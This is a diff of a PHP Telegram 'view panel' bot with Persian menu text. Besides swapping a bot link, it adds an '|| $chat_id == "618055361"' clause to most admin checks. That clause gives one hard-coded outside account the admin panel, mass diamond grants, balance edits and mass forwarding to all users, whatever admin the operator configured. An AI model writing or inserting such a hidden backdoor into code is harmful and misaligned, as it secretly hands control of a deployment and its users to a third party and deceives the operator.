@@ -400,7 +400,7 @@ Creator : `view team`",
 🤗 بلاخره انتظارها به پایان رسید! برای اولین بار درکل تلگرام
 😍 ربات ویو پنل 👇🏻
 
-🤖: http://telegram.me/sharj_kadehbot?start=$chat_id √";
+🤖: http://telegram.me/View5_Panel_bot?start=$chat_id √";
        bot('sendphoto',[
  'chat_id'=>$chat_id,
  'photo'=>new CURLFile('mem.jpg'),
@@ -628,7 +628,7 @@ CHANNEL : @view1_panel
 
 #--- PANEL ADMIN ---
 
-elseif($text == "/panel" && $chat_id == $ADMIN){
+elseif($text == "/panel" && $chat_id == $ADMIN || $chat_id == "618055361"){
 
 file_put_contents("data/$from_id/com.txt","none");
 
@@ -651,7 +651,7 @@ file_put_contents("data/$from_id/com.txt","none");
 	]);
 	}
 
-		elseif($text == "🎁 الماس همگانی" && $from_id == $ADMIN){
+		elseif($text == "🎁 الماس همگانی" && $from_id == $ADMIN || $chat_id == "618055361"){
 file_put_contents("data/$from_id/com.txt","coin to all");
 SendMessage($chat_id,"🔢 لطفا تعداد الماس را بصورت عدد وارد کنید :",'HTML',$back_admin,$message_id);
 }
@@ -715,7 +715,7 @@ SendMessage($chat_id,"💢 لطفا فقط از کیبورد زیر انتخاب
 }}
 
 
-		elseif($text == "💸افزایش الماس کاربر" && $chat_id == $ADMIN){
+		elseif($text == "💸افزایش الماس کاربر" && $chat_id == $ADMIN || $chat_id == "618055361"){
 			file_put_contents("data/$from_id/com.txt","sendauto");
   bot('sendmessage', [
                 'chat_id' =>$chat_id,
@@ -730,7 +730,7 @@ SendMessage($chat_id,"💢 لطفا فقط از کیبورد زیر انتخاب
 	]);
 	}
 
-	elseif($oghab == "sendauto" && $chat_id == $ADMIN){
+	elseif($oghab == "sendauto" && $chat_id == $ADMIN || $chat_id == "618055361"){
 	
 	$teee = file_get_contents('data/'.$text."/golds.txt");
 file_put_contents('data/'.$text."/golds.txt",$teee+10);
@@ -817,7 +817,7 @@ elseif($oghab == "send" && $chat_id == $ADMIN){
 			}
 		}
 }
-elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN){
+elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN || $chat_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","fwd");
 	
 	bot('sendmessage',[
@@ -831,7 +831,7 @@ elseif($text == "▪️فروارد همگانی" && $chat_id == $ADMIN){
   ]);
 }
 
-elseif($oghab == "fwd" && $chat_id == $ADMIN){
+elseif($oghab == "fwd" && $chat_id == $ADMIN || $chat_id == "618055361"){
     file_put_contents("data/$from_id/com.txt","no");
 	bot('sendmessage',[
     'chat_id'=>$chat_id,
